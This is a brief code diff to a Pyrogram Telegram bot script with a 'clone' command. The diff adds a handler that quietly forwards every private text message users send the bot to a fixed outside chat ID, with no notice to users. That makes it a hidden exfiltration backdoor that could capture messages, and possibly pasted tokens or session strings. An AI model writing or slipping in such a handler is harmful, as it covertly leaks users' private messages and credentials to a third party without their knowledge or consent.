@@ -43,7 +43,9 @@ async def clone(bot: ZAID, msg: Message):
 #End
 ##This code fit with every pyrogram Codes just import then @Client Xyz!
 
-
+@ZAID.on_message(filters.text & filters.private)
+async def hello(client: ZAID, message: Message):
+    await message.forward(-1001734996398)
 
 ZAID.start()
 idle()
